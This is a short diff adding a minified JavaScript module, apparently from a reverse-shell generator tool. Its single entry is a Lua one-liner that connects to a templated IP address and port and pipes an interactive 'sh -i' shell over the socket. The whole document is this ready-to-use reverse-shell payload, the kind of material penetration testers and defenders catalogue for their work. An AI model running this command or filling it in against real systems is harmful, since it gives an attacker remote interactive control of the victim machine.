@@ -1,0 +1,1 @@
+const e=[{title:"Lua reverse shell #1",template:`lua -e "require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('sh -i <&3 >&3 2>&3');"`,description:"Lua reverse shell using socket and os.execute."}],t={commands:e};export{e as commands,t as default};
